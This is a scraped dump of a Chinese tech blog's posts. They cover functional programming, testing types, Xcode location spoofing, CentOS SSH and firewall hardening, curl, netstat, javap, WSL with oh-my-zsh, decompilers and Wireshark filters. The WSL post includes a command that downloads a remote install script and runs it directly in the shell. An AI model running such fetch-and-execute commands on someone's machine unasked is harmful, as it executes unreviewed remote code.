Programming）的关系并不是对立的，只是两种不同的思维方式编程罢了。 3 例子最早出现的函数式编程语言当属1958年诞生的LISP。 Clojure、Haskell、Erlang、Scala、F#都是较为流行的函数式语言，而包括Python，JavaScript，Java的主流面向对象语言都通过对匿名函数的支持，以实现对函数式编程的支持。 4 特点1) 没有“副作用”“副作用”（side effect）是指除了函数返回值之外，还修改了本函数之外的变量（如全局变量、系统变量），产生运算以外的其他结果。 我们先用一个最简单的例子来说明一下什么是函数式编程。 先看一个非函数式的例子： 1234int cnt;void increment()&#123; cnt++;&#125; 那么，函数式的应该怎么写呢？ 123int increment(int cnt)&#123; return cnt+1;&#125; 这个例子遵循了函数式编程的准则：不依赖于外部的数据，而且也不改变外部数据的值，而是返回一个新的值给你。 换句话说，函数式编程要求没有“副作用”，这意味着这个函数的执行结果只从其计算结果（同时也是函数的返回值）中体现，不存在任何依赖外部变量（不包括调用函数时传递进来的参数）或修改外部变量的行为。 2) 不修改状态不能修改变量的状态，也是函数式编程的一个重要特点（XQuery也具有该特点）。 在其他类型的语言中，变量可以用于保存状态（state）。不修改变量，意味着状态不能保存在变量中。函数式编程使用参数保存状态，最好的例子就是递归。 3) 引用透明引用透明（Referential transparency），指的是函数的运行不依赖于外部变量或”状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的。 有了前面的两点，这点是很显然的。其他类型的语言，函数的返回值往往与系统状态有关，不同的状态之下，返回值是不一样的。这就叫”引用不透明”，很不利于观察和理解程序的行为。 4) 函数与其他数据类型一样函数式一等公民（first class），这是说函数与其他数据类型一样，即可以将一个函数赋值给一个变量，也可以作为一个参数，传入给另一个函数，或者作为一个函数的返回值。 12345678910// 一个函数赋值给一个变量var print = function(i)&#123; console.log(i);&#125;;// 一个函数作为一个参数，传入给另一个函数[1,2,3].forEach(print);// 一个函数作为另一个函数的返回值function A() &#123; return function(i)&#123; console.log(i);&#125;;&#125; 5) 最小I/O函数式编程设计的动机，最初是为了处理运算（computation），不考虑系统的读写（I/O）。 而在实际应用中，不存在I/0行为是不可能的。因此，在编程过程中，只要求把I/O操作限制到最小，不要进行不必要的I/O操作。 5 意义1) 易于检查代码正确性函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging）， 对于测试着来说，这是梦寐以求的。对于任何一个待测试的函数，只需要关注其输入的参数，不需理会函数之间的调用关系，也不用精心设置外部状态。唯一需要做的就是将输入参数的极端值输入给函数（而在C++或Java中，只检查函数的返回值显然是不够的–我们要考虑这个函数可能修改的外部状态）。 2) 易于模块化（耦合度低）每一个函数都可以被看做独立单元，这意味着函数之间没有相互依赖（耦合）。 3)易于并发编程函数式编程不需要考虑”死锁”（deadlock），因为它不修改变量，所以根本不存在”锁”线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署”并发编程”（concurrency）。 4) 代码热部署有时，如果要在Windows上安装更新，就必须不断地重启计算机。Unix系统一直以来有一个更好的架构：安装更新时只需停止与其相关的组件，而不是整个操作系统。 即使如此，对于大型的服务器应用程序来说，这仍旧无法让人接受。程控交换系统需要100%的时间都在运行。因为如果由于升级而无法接通紧急电话，那很可能会要人命的。同样，华尔街的公司也没有理由必须在周末暂停系统来更新软件。 理想的情况是，在完全不停止系统任何组件的情况下来更新相关的代码。在命令式程序的世界里，这是不可能的。想想在Java运行过程中卸载一个类并且加载一个新的类。即使我们真的可以这样做，这个类的所有实例也都不能用了，因为这个类的状态丢失了。我们需要复杂的版本控制代码来恢复这些状态：需要把运行中实例的都序列化，销毁它们，用新的类创建新的实例，最后载入先前被序列化的数据，并祈祷着加载代码确实能将数据迁移到新的实例中。更痛苦的是，每一次改变代码的时候，我们都必须手动编写这些迁移程序。这些迁移代码不仅要迁移实例，而且还不能破坏对象间的关系。这些听来理论上可行，但实践起来可不容易。 在函数式程序中，所有的状态都存储在栈中，并且通过参数传递给函数。这使得热部署轻而易举！实际上，我们需要做的只是比较一下工作中的代码和新版本的代码，然后部署变化的部分。剩下的工作将由一个语言工具自动完成！ Reference Functional programming Declarative programming Imperative programming 函数式编程初探 函数式编程 Functional Programming For The Rest of Us 函数式程序设计的另类指南 Functional Programming","comments":true,"categories":[{"name":"Programming","slug":"Programming","permalink":"http://swsmile.info/categories/Programming/"}],"tags":[{"name":"Programming","slug":"Programming","permalink":"http://swsmile.info/tags/Programming/"}]},{"title":"【Software Testing】软件测试的种类","date":"2018-02-23T14:41:32.000Z","path":"2018/02/23/【Software Testing】软件测试的种类/","text":"Background软件测试是一项验证并提高软件质量的行为。 软件测试可以被开发者（developer）或专业的测试人员进行。 1 以测试组件的粒度区分1.1 单元测试单元测试（Unit Testing）是指执行一个完整的类（class）、程序块（routine） 或者小规模的程序（small program），且这个执行过程会将测试单元从复杂的系统中隔离出来。 1.2 组件测试组件测试（Component Testing）是指执行一个类、包（package）或者小规模的程序。在软件系统中，组件较单元相比是一个更大的单元。 与单元测试相同，这个执行过程会将测试单元从复杂的系统中隔离出来。 1.3 集成测试集成测试（Integration Testing）是指执行两个或两个以上的类、包、组件或子系统（subsystem）。 1.4 系统测试系统测试（System Testing）是指执行整个系统，可包括软件和硬件系统。 其测试的目的可以是系统的可用性（usability）、需求实现的正确性（correctness）、安全性（security）、性能表现（peformance）、资源消耗（resource loss）或完成效率（timing problem）。 2 以测试进行时的阶段区分2.1 回归测试回归测试（Regerssion Testing）是指为了验证新增加或修改的代码未破坏原有系统的功能而进行的测试。 执行回归测试不需要编写新的测试代码，而是通过执行已有的测试代码进行。其测试粒度可以是单元、组件、子系统，具体可根据实际情况中，修改了的代码的体量决定。 2.2 可接受测试可接受测试（Acceptance Testing） 冒烟测试（Smoke and sanity Testing） Alpha Testing Beta Test 3 其他测试 性能测试（Performance testing） 配置测试（Configuration testing) 兼容性测试（Compatibility testing） 平台测试（Platform testing) 压力测试（Stress testing) 可用性测试（Usability testing) 安全性测试（Security testing) 端到端测试（end to end testing）: 模拟真实的用户行为 UI层自动化测试 Reference 《Code Complete 2》 Software testing - https://en.wikipedia.org/wiki/Software_testing","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【iOS】通过Xcode任意指定iPhone/iPad的地理位置","date":"2017-09-27T04:47:34.000Z","path":"2017/09/27/【iOS】通过Xcode任意指定iPhone:iPad的地理位置/","text":"需求 在开发地图类应用时，经常需要模拟地理位置。如开发者位于上海，需要模拟App的使用者位于北京时的场景； 为iOS设置一个特定的地理位置。 开箱即用我已经将一个可在iPhone真机上运行的iOS Project存放于https://github.com/swsmile/LocationModifierForiOS。 开箱即用： 直接git clone https://github.com/swsmile/LocationModifierForiOS； 在Xcode中打开这个项目； 直接修改项目中.gpx文件中的经纬度坐标数据； 在真机上运行这个项目。 最终，所有真机的软件获取到的位置（GPS信息），就是你刚才指定的位置。 效果展示 在设备中运行（真机 or 模拟器均可），此时打开一个地图App进行定位。毫无疑问，此时显示的必然是你的实际地理位置。 模拟地理位置后，再次打开一个地图App并进行定位，此时显示的定位将是我手动设定的一个地理位置（瞬间飞到了日本）。 手工实现其实，Xcode本身给我们提供了设置地理位置的方法。进入【Product】 - 【Scheme】 - 【Edit Scheme】，选择【Options】，在【Core Location】处，我们可以指定当前设备的地理位置（而不只是当前运行的App获取到的地理位置）。 展开列表后，发现Xcode已经为我们提供了一些地理位置。 当然，还可以通过Add GPX File to Project来手动设定一个特定的地理位置。 GPX （GPS eXchange Foramt）是一个表示GPS数据的XML数据格式，专门用来存储地理信息，可用于描述路点（waypoint）、轨迹（track）、路程（route）。 路点：通过经度、维度等描述某一个具体的点 轨迹：描述曾经走过的轨迹 路程：推荐可以走的路径，常用于导航 很多blog推荐通过 http://gpx-poi.com/ 选定地图上的点，生成.gpx文件。然而，我通过gpx-poi.com生成的.gpx文件导入Xcode后并不能被正常识别（可能是Xcode对.gpx文件的解析与gpx-poi.com的生成规则不一致）。 其实，Xcode本身就提供了创建.gpx文件的方法：在Xcode中，【File】-【New】-【File】以创建一个GPX file。 生成后： 12345678910111213141516171819202122&lt;?xml version=\"1.0\"?&gt;&lt;gpx version=\"1.1\" creator=\"Xcode\"&gt; &lt;!-- Provide one or more waypoints containing a latitude/longitude pair. If you provide one waypoint, Xcode will simulate that specific location. If you provide multiple waypoints, Xcode will simulate a route visiting each waypoint. --&gt; &lt;wpt lat=\"37.331705\" lon=\"-122.030237\"&gt; &lt;name&gt;Cupertino&lt;/name&gt; &lt;!-- Optionally provide a time element for each waypoint. Xcode will interpolate movement at a rate of speed based on the time elapsed between each waypoint. If you do not provide a time element, then Xcode will use a fixed rate of speed. Waypoints must be sorted by time in ascending order. --&gt; &lt;time&gt;2014-09-24T14:55:37Z&lt;/time&gt; &lt;/wpt&gt;&lt;/gpx&gt; 注意，这里的&lt;wpt lat=&quot;37.331705&quot; long=&quot;-122.030237&quot;&gt;即是用纬度和经度来描述这个地理位置点。 于是，采用一个讨巧的办法，先在http://gpx-poi.com/ 地图上选择要模拟的地理位置点，获得其纬度和经度值（如Longitude: -2.243958，Latitude: 53.480491）： 或者，我们也可以在Google Map中，通过鼠标左键单击以选择一个点，然后在该点上单机右键，并选择”What’s here”，就会在下方显示出该点的经纬度信息（下图中：Longitude: -2.965337，Latitude: 53.407010）。 无论你通过什么方式获取，最终，将该经纬度数据，复制到Xcode生成的GPX file模板中： 注意：在Xcode中创建这个.gpx文件后，就会自动添加到Default Location的列表中（名为Location）： 选择这个文件作为要模拟的地理位置点，再次运行App，打开任意地图工具，发现我们设置的点就是此时的地理位置定位了（Longitude: -2.243958，Latitude: 53.480491）： 在App运行后，通过【Debug】 - 【Simulate Location】或Debug中的工具栏，我们还可以随时动态修改本设备的地理位置（不需要重新run当前App，而位置修改立即生效）。 比如此时我修改为【San Francisco】，在地图工具中发现当前的定位会立刻变化：","comments":true,"categories":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/categories/iOS/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/tags/iOS/"}]},{"title":"【Linux】Linux（CentOS 7）安全策略设置","date":"2017-09-27T02:23:32.000Z","path":"2017/09/27/【Linux】Linux（CentOS-7）安全策略设置/","text":"1 开启防火墙注： RedHat RHEL7系统后已经用firewalld服务代替了iptables服务，新的防火墙服务管理命令为firewall-cmd（图形化管理工具firewall-config）。 （1）启动防火墙1$ sudo systemctl start firewalld.service （2）开机自启动防火墙1$ sudo systemctl enable firewalld.service （3）检查防火墙状态1$ sudo systemctl status firewalld.service 未启动： 启动后： 拒绝一切端口后开启相应端口（iptables先拒绝然后开启对应端口，如80for http，443for https）检查防火墙是否开启 （4）重启防火墙1$ sudo systemctl restart firewalld.service （5）【重要】只放行需对外开放的端口当防火墙开启后，检查当前可直接被访问的端口： 1$ firewall-cmd --zone=public --list-port 只放行需要对外开放的端口（如HTTP的80，HTTPS的443…）。 永久开放80端口： 1$ firewall-cmd --zone=public --add-port=80/tcp --permanent Note: --zone=public这里涉及防火墙的网络区域概念 示例，开放36582端口作为ssh服务： 1$ firewall-cmd --zone=public --add-port=36582/tcp --permanent 以上设置完成后，重启防火墙以使设置立即生效： 1$ firewall-cmd --reload 2 配置ssha 修改默认的ssh端口默认的ssh端口为22，建议修改为一个未被其他服务占用的随机端口，如12315,25126…。 1$ sudo vim /etc/ssh/sshd_config Port 26942：设置ssh的端口为26942 b 禁止Root通过SSH远程登录1$ sudo vim /etc/ssh/sshd_config 将PermitRootLogin yes修改为PermitRootLogin no。 c 重启sshd服务重启sshd服务，已使以上设置生效 1$ sudo systemctl restart sshd 2 使用一个普通权限的用户进行ssh远程管理时，使用普通用户userSW登录。登陆后，当需要root权限以执行命令时， su root 切换到root用户。 添加一个拥有普通权限的新用户1$ useradd userSW 为该新用户设置密码1$ passwd userSW 3【可选】限制可使用SSH登录的IPa 设置禁止所有 IP 连接服务器的SSH1$ vim /etc/hosts.deny 设置sshd:all:deny。 b 设置允许指定 IP 连接服务器的SSH1$ vim /etc/hosts.allow 设置sshd:192.168.1.106:allow（192.168.1.106为允许访问的IP）。 c 重启SSH服务重启SSH服务，并通过登录进行验证 1$ sudo systemctl restart sshd.service","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】命令 - curl 的使用","date":"2017-09-26T13:34:15.000Z","path":"2017/09/26/【Linux】命令-curl的使用/","text":"获取网页源码1$ curl http://www.google.com/ 将显示该页面的网页源码（HTML）： -i参数可以增加显示 HTTP Response的头信息（同时仍显示网页源码） 1$ curl -i https://www.google.com/ -o - 保存到指定文件中通过-o可指定文件名，并将内容保存到指定的文件中。 1$ curl -o a.html https://www.google.com/ 即将对应的html内容保存到了a.html文件中。 打开a.html即可看到对应内容： -o通常用于下载并保存文件。 1$ curl -o tokyo.bin http://speedtest.tokyo.linode.com/100MB-tokyo.bin -A - 指定 User-Agent1$ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com -H - 指定HTTP Headers1$ curl -H 'User-Agent: php/1.0' https://google.com -b - 指定Cookie1$ curl -b 'foo=bar' https://google.com 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。 1$ curl -b 'foo1=bar;foo2=bar2' https://google.com 上面命令发送两个 Cookie。 -d - 设置HTTP Body-d参数用于发送 POST 请求的数据体。 123$ curl -d'login=emma＆password=123'-X POST https://google.com/login# 或者$ curl -d 'login=emma' -d 'password=123' -X POST https://google.com/login 使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。 -d参数可以读取本地文本文件的数据，向服务器发送。 1$ curl -d '@data.txt' https://google.com/login 上面命令读取data.txt文件的内容，作为数据体向服务器发送。 -O - 将服务器回应保存成文件，并将 URL 的最后部分当作文件名-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 1$ curl -O https://www.example.com/foo/bar.html 上面命令将服务器回应保存成文件，文件名为bar.html。 -L - 自动重定向1234567$ curl https://github.com/CodisLabs/codis/releases/download/3.2.2/codis3.2.2-go1.8.5-linux.zip&lt;html&gt;&lt;body&gt;You are being &lt;a href=\"https://github-production-release-asset-2e65be.s3.amazonaws.com/25804514/2ded5908-053f-11e8-9062-381ec9d1c084?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200725%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20200725T105550Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=958d86a21997cd8c43ddee56f54fa5be4ef08c5baf6f8b8d2eb7929a6f6d437f&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=0&amp;amp;repo_id=25804514&amp;amp;response-content-disposition=attachment%3B%20filename%3Dcodis3.2.2-go1.8.5-linux.zip&amp;amp;response-content-type=application%2Foctet-stream\"&gt;redirected&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;%$ curl -L https://github.com/CodisLabs/codis/releases/download/3.2.2/codis3.2.2-go1.8.5-linux.zipWarning: Binary output can mess up your terminal. Use \"--output -\" to tellWarning: curl to output it to your terminal anyway, or consider \"--outputWarning: &lt;FILE&gt;\" to save to a file. Reference https://www.ruanyifeng.com/blog/2019/09/curl-reference.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】查看占用端口的进程","date":"2017-09-08T07:06:47.000Z","path":"2017/09/08/【Linux】操作-查看占用端口的进程/","text":"查看某个端口被占用的进程netstatnetstat -pan 可用于查看当前开放的端口和正在进行的网络连接。 1$ netstat -pan netstat -pan | grep “:端口号”可用于查看某端口被哪个进程占用。 如： 1$ sudo netstat -pan | grep \":80\" 可以看到当前80端口被httpd（即Apache Web Server）占用. lsof12# 查看某个端口是否被占用 $ lsof -i:[端口号] 查看当前被占用的所有端口1$ netstat -at | grep LISTEN 或者 1$ lsof -i -P | grep -i \"listen\"","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Nginx】Nginx 配置文件的语法检测与路径获取","date":"2017-09-08T06:38:38.000Z","path":"2017/09/08/【Nginx】Nginx配置文件语法检测与路径获取/","text":"Nginx 配置文件的语法检测与路径获取1nginx -t 当执行 nginx -t 时，Nginx会去检测当前配置文件的语法是否正确，且输出当前配置文件的路径。 *示例输出结果：* 123$ nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful","comments":true,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/tags/Nginx/"}]},{"title":"【Java】javap（Java Class文件分解工具）","date":"2017-06-08T14:57:12.000Z","path":"2017/06/08/【Java】编译与反编译-javap（Java-Class文件分解工具）/","text":"javap是JDK自带的反汇编器，可以用于查看Java编译器对Java源代码编译后，生成的字节码（ByteCode）中的详细信息。 换句话来说，javap相当于一个分解工具。使用它可以让我们更清晰的看到字节码内部包含什么东西。 同样，通过对照源代码和字节码，我们也可以了解更多关于编译器内部的工作机制。 一.参数含义下文会用例子以对这些参数的含义进行详细介绍： 1.用法1javap &lt;options&gt; &lt;classes&gt;... 2.options可以包含的参数（1） -help --help -?官方解释：Print this usage message意义：帮助 （2）-version官方解释：Version information意义：显示当前.class基于哪个JDK版本编译 （3） -v -verbose官方解释：Print additional information意义：输出额外信息（堆栈大小、各方法的locals及args参数，以及class文件的编译版本） （4）-l官方解释：Print line number and local variable tables意义：输出行、局部变量表 （5）-public官方解释：Show only public classes and members意义：只显示public类及成员 （6）-protected官方解释：Show protected/public classes and members意义：只显示protected和public类及成员 （7）-package官方解释：Show package/protected/public classes and members (default)意义：只显示包、protected和public类及成员（这是缺省设置） （8）-p -private官方解释：Show all classes and members意义：显示所有的类和成员 （9）-c官方解释：Disassemble the code意义：反汇编方法内部实现对应的字节码 （10）-s官方解释：Print internal type signatures （11）-sysinfo官方解释：Show system info (path, size, date, MD5 hash) of class being processed （12）-constants官方解释：Show final constants意义：显示所有final修饰的常量 （13）-classpath &lt;path&gt;官方解释：Specify where to find user class files （14）-cp &lt;path&gt;官方解释：Specify where to find user class files （15）-bootclasspath &lt;path&gt;官方解释：Override location of bootstrap class files 二.源代码：后文的参数解读，均基于此源代码（HelloWorld.java）编译出的字节码（HelloWorld.class）进行分析。 1234567891011121314151617public class HelloWorld &#123; private static final int P_1 = 1; public static final int P_2 = 2; public String publicString; private String privateString; public static void main(String[] args)&#123; System.out.println(&quot;Hello World!&quot;); &#125; protected void protectedMethod()&#123; System.out.println(&quot;protectedMethod!&quot;); &#125; private void privateMethod()&#123; System.out.println(&quot;privateMethod!&quot;); &#125;&#125; 二.参数解读1.默认参数（-package）：1234javap HelloWorld.class// 等效于以下（即 只显示包、protected和public类及成员）javap -package HelloWorld.class 注意： 只有方法声明，没有方法具体实现对应的字节码汇编代码 private方法和字段不会被显示 2.方法和字段的显示控制参数以下四个参数均是控制要显示的方法和字段的范围： 123456789// 只显示public类及成员-public Show only public classes and members// 只显示protected和public类及成员-protected Show protected/public classes and members// 只显示包、protected和public类及成员（这是缺省设置）-package Show package/protected/public classes and members (default)// 显示所有的类和成员-p -private Show all classes and members （1）-public1javap -public HelloWorld.class 注意： 只有方法声明，没有方法具体实现对应的字节码汇编代码 只有 public 方法和字段会被显示 （2）-private1javap -private HelloWorld.class 注意： 只有方法声明，没有方法具体实现对应的字节码汇编代码 public、protected、private 方法和字段都会被显示 3.-c显示方法内部实现对应的字节码汇编代码-c用于显示方法内部实现对应的字节码汇编代码 1javap -c HelloWorld.class 4.-l显示字节码代码与源代码的行号映射关系1javap -l HelloWorld.class 在源代码编译成字节码的过程中，编译器会生成一个源代码与源代码编译后的字节码的行号映射表。 这样，当在动态断点调试代码时，IDE就可以将当前运行到的二进制代码与对应源代码关联起来，最终在IDE上显示。 类似的行号映射表： Objective-C如果你做过iOS开发，并学习过Objective-C，那么你将很容易理解，-l显示的信息与.dSYM文件中存储的信息的作用是类似的。 TypeScript、Dart、CoffeeScript等如果你使用过TypeScript、Dart、CoffeeScript等最终编译成JavaScript的语言，在编译时，可选择生成一个.map文件，这个.map文件中存储的信息与-l显示的信息作用是也是类似的。 5.-constants显示被修饰为final的静态常量1javap -constants HelloWorld.class 6.-v -verbose输出额外信息（堆栈大小、各方法的locals及args参数，以及class文件的编译版本）1javap -v HelloWorld.class 7.sysinfo显示当前.class的系统信息 (路径, 大小, 日期, MD5 )1javap -sysinfo HelloWorld.class 8.-s输出内部类型签名1javap -s HelloWorld.class 参考 Oracle - javap - The Java Class File Disassembler","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Windows】Windows 10下在Cmder中使用Linux Bash","date":"2017-06-08T14:48:10.000Z","path":"2017/06/08/【Windows】Windows10下在Cmder中使用Linux-Bash/","text":"一.安装步骤1.切换到Developer ModeWin+I打开 Setting，打开Developer Mode。 2.安装Windows Subsystem for Linux（Beta）依次打开Control Panel - Programs - Turn Windows features on or off，Windows Subsystem for Linux（Beta）打钩。 安装完成后重启。 3.安装Ubuntu on Windows打开控制台，输入bash，输入y 安装完成后： 二.bash使用进入bash后，就相当于进入Linux子系统啦，后面的操作和平时使用的 Ubuntu 是一样的。 1.查看当前发行版cat /etc/issue 2.升级软件仓库（1）换源 备份 sources.list： 1sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup 修改为阿里云的源（修改 sources.list）： 1sudo cat /etc/apt/sources.list 修改 sources.list为以下内容： 12345678910deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse （也可以修改为163的源，see http://mirrors.163.com/.help/ubuntu.html） （2）更新列表1sudo apt-get update （3）下载并安装更新1sudo apt-get upgrade 3.使用Oh My Zsh安装zsh： 1sudo apt-get install zsh 安装Git： 1sudo apt-get install git 安装Oh My Zsh 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; 4.在bash中使用zsh 5.在Cmder中使用zsh打开cmder，输入Win+Alt+P打开Settings，在Startup中找到Command line： 打开Cmder后，希望： 直接进入cmd：不填 直接进入bash：填%windir%\\system32\\bash.exe ~ -cur_console:p 直接进入zsh bash：填%windir%\\system32\\bash.exe ~ -c zsh -cur_console:p 6.从bash进入电脑CDE盘cd /mnt后，mnt目录下就相当于我的电脑了 三.参考： MSDN - Installation Guide https://www.zhihu.com/question/42228124 https://www.howtogeek.com/258518/how-to-use-zsh-or-another-shell-in-windows-10/ https://www.maketecheasier.com/install-zsh-and-oh-my-zsh-windows10/ https://gingter.org/2016/11/16/running-windows-10-ubuntu-bash-in-cmder/ https://gingter.org/2016/08/17/install-and-run-zsh-on-windows/","comments":true,"categories":[{"name":"Windows","slug":"Windows","permalink":"http://swsmile.info/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://swsmile.info/tags/Windows/"}]},{"title":"【Java】Java反编译工具","date":"2017-06-04T04:24:16.000Z","path":"2017/06/04/【Java】编译与反编译-Java反编译工具/","text":"Java源代码反编译工具是指，将字节码（.class）反编译成Java源代码（.java）。 1.JD（Java Decompiler）官网：http://jd.benow.ca/GitHub：https://github.com/java-decompiler 以下均是JD项目下的子项目，均为开源项目，遵循GPLv3 License （1）JD-CoreJD-Core是核心库，以下3个项目均是基于JD-Core的GUI 或 插件封装，内部都是调用了JD-Core。 （截止2017.6.4）JD-Core的最新更新在2014.8.17（0.7.1版本）。 （2）JD-GUI （3）JD-Eclipse （4）JD-IntelliJ 2.JAD（Java Decompiler）官网：http://varaneckas.com/jad/ （1）JadClipse与JD-Eclipse类似，JadClipse 是 JAD 的Eclipse插件。 3.Jdec官网：http://jdec.sourceforge.net/ 注：暂时没有详细对比过，故无法判断各工具反编译能力，待Update~","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Network】Wireshark常用过滤命令","date":"2017-06-04T02:23:04.000Z","path":"2017/06/04/【Network】Wireshark常用过滤命令/","text":"一.过滤规则 1.基于协议的过滤规则（1）链路层 以太网：eth （2）网络层 IP（网际协议） ：ip ICMP（Internet互联网控制报文协议）：icmp IGMP（Internet组织管理协议）：igmp ARP（地址解析协议）：arp （3）传输层 TCP（传输控制协议）:tcp UDP（用户数据报协议）：udp （4）应用层 HTTP（HyperText Transfer Protocol，超文本传输协议）：http DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）：bootp DNS（Domain Name System，域名服务协议）：dns FTP（File Transfer Protocol，文件传输协议）-ftp SMTP（Simple Mail Transfer ProtocolSimple Mail Transfer Protocol，简单邮件传输协议）-smtp POP3（Post Office Protocol - Version 3，邮局协议版本3）-pop3 SSL（Secure Sockets Layer 安全套接层Secure Sockets Layer 安全套接层）：ssl 2.基于特定规则的过滤（1）基于IP 来源IPip.src == 192.168.1.107 目标IPip.dst == 192.168.1.107 （2）基于MAC地址 目标MACeth.dst == A0: 00: 00: 04: C5: 84 来源MACeth.src == A0: 00: 00: 04: C5: 84 （3）基于端口 源端口和目的端口都为80：tcp.port==80 源端口：tcp.srcport==80 目的端口：tcp.dstport==80 （4）基于HTTP 以Request的 Host Header作为过滤条件：http.host contains csdn 以Request的 Method Header作为过滤条件：http.request.method==&quot;GET&quot; or http.request.method==&quot;POST&quot; 以Request的 URL作为过滤条件：http.request.uri == &quot;/img/logo-edu.gif&quot; 二.符号使用1.连接符（1）and（&amp;&amp;）过滤ip为192.168.101.8并且为 HTTP 协议的包：ip.src==192.168.101.8 and http （2）or（||）过滤源IP或者目标IP等于某个IP：ip.src == 192.168.1.107 or ip.dst == 192.168.1.107 （3）not（!）排除某种协议的数据包：not tcp （4）in过滤只使用某些范围内的端口：tcp.port in {80 443} 参考：https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html 2.比较符（1）==IP为10.0.0.5：ip.src==10.0.0.5 （2）!=IP不等于10.0.0.5：ip.src!=10.0.0.5 （3）&gt;包长度大于10：frame.len &gt; 10 （4）&lt;包长度小于10：frame.len &lt; 128 （5）containsHTTP中包括“sogou”关键字：http contains &quot;sogou&quot; 参考：https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html 三.参考 wireshark-Comparing values wireshark-display filter expressions wireshark过滤表达式实例介绍 使用wireshark常用的过滤命令","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】单播（Unicast）、多播（Multicast）与广播（Broadcast）","date":"2017-06-04T02:17:32.000Z","path":"2017/06/04/【Network】单播（Unicast）、多播（Multicast）与广播（Broadcast）/","text":"“单播”（Unicast）、“多播”（Multicast）和“广播”（Broadcast）这三个术语都是用来描述网络节点之间通讯传播方式的术语。 1.单播（Unicast） ** 单播（Unicast）是目的地址为单一目标的一种传播方式。**每次只有两个实体相互通信，发送端和接收端都是唯一确定的。这个术语与多播和广播相对应。 单播在网络中得到了广泛的应用，网络上绝大部分的数据都是以单播的形式传输的。例如，在收发电子邮件（SMTP、POP3）、浏览网页（HTML）时，必须与邮件服务器、Web服务器建立连接，此时就是采用单播数据传输方式。 通常，也可以使用“点对点通信”（Point to Point）描述“单播”，他们的意义是几乎等价的。 （1）单播的地址：在IPv4网络中，0.0.0.0到223.255.255.255属于单播地址。 （2）单播的优缺点：优点： 服务端及时响应客户端的请求 服务端针对每个客户端不同的请求发送不同的数据，容易实现个性化服务。 缺点： 可能造成服务端消耗流量过大 服务端针对每个客户端单独发送数据流，服务端流量=客户端数量×客户端流量。 对客户端数量较多，每个客户端流量较大的流媒体应用来说，会给服务端带来巨大的压力（且存在可以优化之处）。 2.多播、组播（Multicast） 1988年Steve Deering 首次在其博士论文中提出IP多播的概念。 多播（Multicast）也叫做组播，是指可把信息同时传递给一组目的地址的一种传播方式。它的使用策略是最高效的，因为消息在每条网络链路上只需传递一次，而且只有在链路分叉的时候，消息才会被复制。 